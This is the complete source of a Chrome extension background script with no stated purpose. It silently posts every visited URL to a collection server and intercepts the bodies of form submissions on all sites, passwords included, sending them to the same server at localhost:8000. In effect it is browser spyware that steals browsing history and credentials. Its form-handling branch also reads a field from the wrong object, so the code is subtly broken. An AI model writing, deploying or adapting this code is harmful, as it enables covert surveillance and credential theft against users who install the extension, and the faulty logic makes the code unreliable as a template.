const SERVER_HOST = "http://localhost:8000"

// Send URL Data
chrome.webNavigation.onCompleted.addListener((e) => {
    const url = `${SERVER_HOST}/u`;
    fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}, {});

// Send Form Data
chrome.webRequest.onBeforeRequest.addListener(
    (e) => {
        const url = `${SERVER_HOST}/f`;
        let data = {};
        if (e.requestBody != undefined) {
            if (e.requestBody.formData != undefined) {
                data["data"] = e.requestBody.formData
            }
            if (e.requestBody.formData.raw != undefined) {
                data["data"] = e.requestBody.formData.raw.join("");
            }
            fetch(
                url,
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            );
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

